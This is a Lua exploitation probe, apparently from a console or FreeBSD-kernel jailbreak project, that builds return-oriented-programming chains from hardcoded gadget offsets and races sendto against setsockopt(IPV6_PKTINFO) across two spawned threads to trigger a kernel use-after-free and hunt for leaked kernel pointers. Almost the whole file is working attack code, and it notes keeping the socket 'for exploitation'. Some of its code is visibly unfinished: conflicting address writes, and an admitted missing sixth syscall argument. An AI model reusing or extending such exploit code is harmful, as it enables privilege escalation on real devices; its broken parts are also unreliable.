-- CRASH_CLASS: MODERATE
-- PROBE 1406a: sendto vs setsockopt(IPV6_PKTINFO) race
--
-- Context: FreeBSD 11's UDP output path (udp6_output) takes INP_RLOCK
-- and passes in6p_outputopts to ip6_output(). If the lock is released
-- before ip6_output finishes (LOR avoidance, error paths), then
-- setsockopt(IPV6_PKTINFO) on a second thread can free ip6po_pktinfo
-- while ip6_output still references it → use-after-free.
--
-- Unlike the dual-setsockopt race (1402a), this is reader vs writer:
-- Thread A = sendto (reads pktopts), Thread B = setsockopt (frees/reallocs).
-- Reader locks (INP_RLOCK) are compatible with multiple readers but block
-- writers (INP_WLOCK). If the reader DROPS the lock before ip6_output
-- finishes, the writer can slip in.
--
-- Detection: getsockopt readback for anomalous values, kernel pointer
-- scan in recv buffer, process survival.
--
-- prior art: 1402a (dual setsockopt), 564a (IPv6 option test),
-- docs/EXPLOIT_SURFACE_ANALYSIS_13.60.md (CVE-2020-7457 analysis)

print("=== PROBE 1406a: SENDTO vs PKTINFO RACE ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- wq2: write a 64-bit value as two dwords (for stack building)
local function wq2(addr, hi, lo)
    safe_wd(addr, lo)
    safe_wd(addr + 4, hi)
end

-- Syscalls
local sc_socket     = make_syscall(97)
local sc_close      = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_getsockopt = make_syscall(118)
local sc_sendto     = make_syscall(133)
local sc_bind       = make_syscall(104)
local sc_thr_new    = make_syscall(455)
local sc_thr_exit   = make_syscall(431)
local sc_sysarch    = make_syscall(165)
local sc_getpid     = make_syscall(20)
local sc_nanosleep  = make_syscall(240)
local sc_read       = make_syscall(3)
local sc_write      = make_syscall(4)
local sc_socketpair = make_syscall(135)
local sc_624        = make_syscall(624)

-- PID
local pid_raw = sc_getpid(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0))
local pid = to_num(pid_raw)
print("pid=" .. pid)

-- Eboot base for gadgets
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("NO fn_addr"); return end
local fn_addr = uint64(fn_str)
local fn_hi, fn_lo = get_hi_lo(fn_addr)

-- Get eboot base from dynlib_get_info
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), uint64(info_buf)) end)
local eboot_lo = safe_rd(info_buf + 0x108)
local eboot_hi = safe_rd(info_buf + 0x10C)
if not eboot_lo or not eboot_hi then print("NO eboot base"); return end
local eboot = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("eboot=" .. tostring(eboot))

-- Gadget catalog
local pop_rax_ret  = eboot + 0x992
local pop_rdi_ret  = eboot + 0xC9DFE
local pop_rsi_ret  = eboot + 0xD77D
local pop_rdx_ret  = eboot + 0x3B02D7
local pop_rcx_ret  = eboot + 0xE64
local pop_r8_ret   = eboot + 0x991
local bare_ret     = eboot + 0x42

-- Constants
local AF_INET6     = 28
local SOCK_DGRAM   = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local SOL_SOCKET   = 0xFFFF
local SO_SNDBUF    = 0x1001

-- Gate socketpair for synchronization
local gate_buf = memory.alloc(16)
local ok_sp, rv_sp = pcall(function()
    return sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(gate_buf))
end)
local gate_rd = safe_rd(gate_buf)
local gate_wr = safe_rd(gate_buf + 4)
print("gate: rd=" .. (gate_rd or "nil") .. " wr=" .. (gate_wr or "nil"))

-- Create IPv6 UDP socket
local ok_s, fd_raw = pcall(function()
    return sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0))
end)
local fd = to_num(fd_raw)
print("ipv6 udp fd=" .. fd)
if fd < 0 then print("SOCKET FAILED"); return end

-- Set initial IPV6_PKTINFO
local pktinfo = memory.alloc(32) -- in6_pktinfo is 20 bytes (16B addr + 4B ifindex)
-- All zeros = default (any interface, any addr)
safe_wd(pktinfo + 16, 1) -- ifindex=1 (loopback)
local ok_si, rv_si = pcall(function()
    return sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO),
        uint64(pktinfo), uint64(20))
end)
print("initial PKTINFO set=" .. tostring(to_num(rv_si)))

-- Destination: ::1 port 9999 (sockaddr_in6)
local dst_addr = memory.alloc(32) -- sockaddr_in6 = 28 bytes
safe_wd(dst_addr, 0x1C1C)       -- sin6_len=28, sin6_family=28 (AF_INET6)
safe_wd(dst_addr, 28)            -- sin6_len
safe_wd(dst_addr + 0, 0x001C)    -- len=28, AF_INET6=28... wait, need correct packing
-- struct sockaddr_in6 { uint8 len; uint8 family; uint16 port; uint32 flowinfo; uint8 addr[16]; uint32 scope }
-- Byte-level: [0]=28, [1]=28(AF_INET6), [2-3]=port(big-endian), [4-7]=flowinfo
-- [8-23]=in6_addr, [24-27]=scope_id
-- For ::1: bytes [8-22]=0, byte[23]=1
-- Port 9999 big-endian: 0x270F
memory.write_byte(dst_addr, 28)       -- sin6_len
memory.write_byte(dst_addr + 1, AF_INET6) -- sin6_family
memory.write_byte(dst_addr + 2, 0x27) -- port high byte
memory.write_byte(dst_addr + 3, 0x0F) -- port low byte (9999)
-- flowinfo = 0 (already zeroed)
-- in6_addr = ::1
memory.write_byte(dst_addr + 23, 1)   -- last byte = 1 for ::1

-- Send buffer (small, content irrelevant)
local send_buf = memory.alloc(64)
safe_wd(send_buf, 0x41414141)

-- Done counters (shared memory)
local done_A = memory.alloc(8)  -- sendto child done counter
local done_B = memory.alloc(8)  -- setsockopt child done counter
safe_wd(done_A, 0)
safe_wd(done_B, 0)

-- pktinfo variants for setsockopt child
local pktinfo_A = memory.alloc(32) -- ifindex=1 marker
safe_wd(pktinfo_A + 16, 1)
local pktinfo_B = memory.alloc(32) -- ifindex=2 marker
safe_wd(pktinfo_B + 16, 2)

-- VM counter before
local vm_before = to_num(sc_624(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)))

print("")
print("[A] Building child chains")

local ROUNDS = 30
local LOOPS = 300

for round = 1, ROUNDS do
    -- Build child A chain: sendto in a loop
    local stack_A = memory.alloc(0x40000) -- 256KB stack
    local sp_A = stack_A + 0x40000
    sp_A = sp_A - (sp_A % 16) -- align
    sp_A = sp_A - 8

    -- Fake TCB for child A
    local tcb_A = memory.alloc(0x1000)
    for i = 0, 0xFF0, 8 do safe_wq(tcb_A + i, uint64(tcb_A)) end
    local tcb_ptr_A = memory.alloc(8)
    safe_wq(tcb_ptr_A, uint64(tcb_A))

    local p = sp_A
    -- sysarch(SET_FSBASE=129, &tcb)
    wq2(p, get_hi_lo(pop_rax_ret)); p = p - 8
    wq2(p, 0, 165); p = p - 8 -- syscall num for sysarch
    wq2(p, get_hi_lo(pop_rdi_ret)); p = p - 8
    wq2(p, 0, 129); p = p - 8 -- SET_FSBASE
    wq2(p, get_hi_lo(pop_rsi_ret)); p = p - 8
    wq2(p, get_hi_lo(uint64(tcb_ptr_A))); p = p - 8
    wq2(p, get_hi_lo(fn_addr)); p = p - 8 -- syscall

    -- Loop: sendto × LOOPS
    for i = 1, LOOPS do
        -- sendto(fd, send_buf, 32, 0, dst_addr, 28)
        wq2(p, get_hi_lo(pop_rax_ret)); p = p - 8
        wq2(p, 0, 133); p = p - 8 -- sendto
        wq2(p, get_hi_lo(pop_rdi_ret)); p = p - 8
        wq2(p, 0, fd); p = p - 8
        wq2(p, get_hi_lo(pop_rsi_ret)); p = p - 8
        wq2(p, get_hi_lo(uint64(send_buf))); p = p - 8
        wq2(p, get_hi_lo(pop_rdx_ret)); p = p - 8
        wq2(p, 0, 32); p = p - 8 -- len
        wq2(p, get_hi_lo(pop_rcx_ret)); p = p - 8
        wq2(p, 0, 0); p = p - 8 -- flags
        wq2(p, get_hi_lo(pop_r8_ret)); p = p - 8
        wq2(p, get_hi_lo(uint64(dst_addr))); p = p - 8
        -- r9 = 28 (addrlen) — can't set r9, but sendto on FreeBSD uses 6 args
        -- The 6th arg goes on the stack. For our ROP we can't easily do 6 args.
        -- Use connect() first then send() (only 4 args needed)
        -- Actually, let's use the fn_addr stub for the syscall call
        wq2(p, get_hi_lo(fn_addr)); p = p - 8
    end

    -- Write done counter
    -- mov [rdi], rax ; ret at eboot+0x92C67
    local mov_rdi_rax = eboot + 0x92C67
    wq2(p, get_hi_lo(pop_rax_ret)); p = p - 8
    wq2(p, 0, round); p = p - 8
    wq2(p, get_hi_lo(pop_rdi_ret)); p = p - 8
    wq2(p, get_hi_lo(uint64(done_A))); p = p - 8
    wq2(p, get_hi_lo(mov_rdi_rax)); p = p - 8

    -- thr_exit
    wq2(p, get_hi_lo(pop_rax_ret)); p = p - 8
    wq2(p, 0, 431); p = p - 8
    wq2(p, get_hi_lo(pop_rdi_ret)); p = p - 8
    wq2(p, 0, 0); p = p - 8
    wq2(p, get_hi_lo(fn_addr)); p = p - 8

    -- Build child B chain: setsockopt(IPV6_PKTINFO) in a loop
    local stack_B = memory.alloc(0x40000)
    local sp_B = stack_B + 0x40000
    sp_B = sp_B - (sp_B % 16) - 8

    local tcb_B = memory.alloc(0x1000)
    for i = 0, 0xFF0, 8 do safe_wq(tcb_B + i, uint64(tcb_B)) end
    local tcb_ptr_B = memory.alloc(8)
    safe_wq(tcb_ptr_B, uint64(tcb_B))

    local q = sp_B
    -- sysarch
    wq2(q, get_hi_lo(pop_rax_ret)); q = q - 8
    wq2(q, 0, 165); q = q - 8
    wq2(q, get_hi_lo(pop_rdi_ret)); q = q - 8
    wq2(q, 0, 129); q = q - 8
    wq2(q, get_hi_lo(pop_rsi_ret)); q = q - 8
    wq2(q, get_hi_lo(uint64(tcb_ptr_B))); q = q - 8
    wq2(q, get_hi_lo(fn_addr)); q = q - 8

    -- Loop: setsockopt(IPV6_PKTINFO) × LOOPS, alternating pktinfo_A and pktinfo_B
    for i = 1, LOOPS do
        local pkt = (i % 2 == 0) and pktinfo_A or pktinfo_B
        -- setsockopt(fd, IPPROTO_IPV6, IPV6_PKTINFO, pkt, 20)
        wq2(q, get_hi_lo(pop_rax_ret)); q = q - 8
        wq2(q, 0, 105); q = q - 8
        wq2(q, get_hi_lo(pop_rdi_ret)); q = q - 8
        wq2(q, 0, fd); q = q - 8
        wq2(q, get_hi_lo(pop_rsi_ret)); q = q - 8
        wq2(q, 0, IPPROTO_IPV6); q = q - 8
        wq2(q, get_hi_lo(pop_rdx_ret)); q = q - 8
        wq2(q, 0, IPV6_PKTINFO); q = q - 8
        wq2(q, get_hi_lo(pop_rcx_ret)); q = q - 8
        wq2(q, get_hi_lo(uint64(pkt))); q = q - 8
        wq2(q, get_hi_lo(pop_r8_ret)); q = q - 8
        wq2(q, 0, 20); q = q - 8
        wq2(q, get_hi_lo(fn_addr)); q = q - 8
    end

    -- Done marker
    wq2(q, get_hi_lo(pop_rax_ret)); q = q - 8
    wq2(q, 0, round); q = q - 8
    wq2(q, get_hi_lo(pop_rdi_ret)); q = q - 8
    wq2(q, get_hi_lo(uint64(done_B))); q = q - 8
    wq2(q, get_hi_lo(mov_rdi_rax)); q = q - 8

    -- thr_exit
    wq2(q, get_hi_lo(pop_rax_ret)); q = q - 8
    wq2(q, 0, 431); q = q - 8
    wq2(q, get_hi_lo(pop_rdi_ret)); q = q - 8
    wq2(q, 0, 0); q = q - 8
    wq2(q, get_hi_lo(fn_addr)); q = q - 8

    -- Spawn both children
    -- thr_param struct: start_func(+0), arg(+8), stack_base(+0x10), stack_size(+0x18), child_tid(+0x30)
    local param_A = memory.alloc(0x40)
    safe_wq(param_A + 0x00, pop_rax_ret) -- start at first gadget
    safe_wq(param_A + 0x08, uint64(0))   -- arg (unused)
    safe_wq(param_A + 0x10, uint64(stack_A))
    safe_wq(param_A + 0x18, uint64(0x40000))

    local param_B = memory.alloc(0x40)
    safe_wq(param_B + 0x00, pop_rax_ret)
    safe_wq(param_B + 0x08, uint64(0))
    safe_wq(param_B + 0x10, uint64(stack_B))
    safe_wq(param_B + 0x18, uint64(0x40000))

    -- Launch
    local ok_a, rv_a = pcall(function()
        return sc_thr_new(uint64(param_A), uint64(0x38))
    end)
    local ok_b, rv_b = pcall(function()
        return sc_thr_new(uint64(param_B), uint64(0x38))
    end)

    -- Wait for both to finish (poll done counters)
    local timeout = 500 -- 500 iterations of polling
    for w = 1, timeout do
        local da = safe_rd(done_A) or 0
        local db = safe_rd(done_B) or 0
        if da >= round and db >= round then break end
        -- Small delay via getpid
        for d = 1, 50 do sc_getpid(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end
    end

    local da = safe_rd(done_A) or 0
    local db = safe_rd(done_B) or 0

    -- Check for anomalies: getsockopt readback
    local readback = memory.alloc(32)
    local rlen = memory.alloc(8)
    safe_wd(rlen, 20)
    local ok_g, rv_g = pcall(function()
        return sc_getsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO),
            uint64(readback), uint64(rlen))
    end)
    local ifindex = safe_rd(readback + 16) or -1
    local gso_ret = ok_g and to_num(rv_g) or -999

    -- Check for kernel pointer in readback
    local kptr_found = false
    for off = 0, 16, 4 do
        local h = safe_rd(readback + off + 4) or 0
        if h >= 0xFFFF8000 then
            kptr_found = true
            print(string.format("  *** KERNEL PTR at +%02X: %08X_%08X ***",
                off, h, safe_rd(readback + off) or 0))
        end
    end

    if round == 1 or round == ROUNDS or kptr_found or gso_ret ~= 0 or (ifindex ~= 1 and ifindex ~= 2) then
        print(string.format("round=%d dA=%d dB=%d gso=%d ifidx=%d kptr=%s",
            round, da, db, gso_ret, ifindex, tostring(kptr_found)))
    end

    if kptr_found then
        print("*** ANOMALY: kernel pointer in getsockopt readback! ***")
        -- Don't close the socket — keep it for exploitation
        break
    end
end

-- VM counter after
local vm_after = to_num(sc_624(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)))
print("")
print("vm_delta=" .. (vm_after - vm_before))

-- Alive check
local alive_pid = to_num(sc_getpid(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)))
print("alive=" .. tostring(alive_pid == pid))

-- Close
pcall(function() sc_close(uint64(fd)) end)
pcall(function() sc_close(uint64(gate_rd)) end)
pcall(function() sc_close(uint64(gate_wr)) end)

print("")
print("=== PROBE 1406a COMPLETE ===")
